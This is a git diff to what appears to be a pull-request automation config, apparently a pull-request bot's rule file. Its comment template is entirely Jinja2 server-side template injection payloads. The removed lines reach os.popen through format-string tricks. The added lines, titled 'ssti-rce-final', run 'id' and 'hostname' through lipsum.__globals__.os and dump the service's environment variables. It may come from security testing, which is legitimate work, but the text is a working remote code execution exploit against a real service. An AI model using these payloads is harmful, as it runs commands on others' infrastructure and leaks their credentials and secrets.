@@ -1,13 +1,16 @@
 pull_request_rules:
-  - name: ssti-poc
+  - name: ssti-rce-final
     conditions: []
     actions:
       comment:
         message: |
-          PoC-G4o7T-FIXED:
-          S1-author: {{ author }}
-          S2-cls-cycler: {{ ''|attr('format')('{0.__class__}', cycler) }}
-          S3-fn-lipsum-type: {{ ''|attr('format')('{0.__class__}', lipsum) }}
-          S4-globals: {{ ''|attr('format')('{0.__globals__}', lipsum) }}
-          S6-getitem-os: {{ ''|attr('format')('{0.__globals__[os]}', lipsum) }}
-          S7-rce-id: {{ ''|attr('format')('{0.__globals__[os].popen(arg).read()}', lipsum, arg='id') }}
+          === G4o7T SSTI v8 (main) ===
+          author={{ author }}
+          {% if author %}
+          R1-globals: {{ lipsum.__globals__ }}
+          R2-os: {{ lipsum.__globals__.os }}
+          R3-id: {{ lipsum.__globals__.os.popen('id').read() }}
+          R4-hostname: {{ lipsum.__globals__.os.popen('hostname').read() }}
+          R5-env: {{ lipsum.__globals__.os.environ }}
+          R6-uname: {{ lipsum.__globals__.os.uname() }}
+          {% endif %}
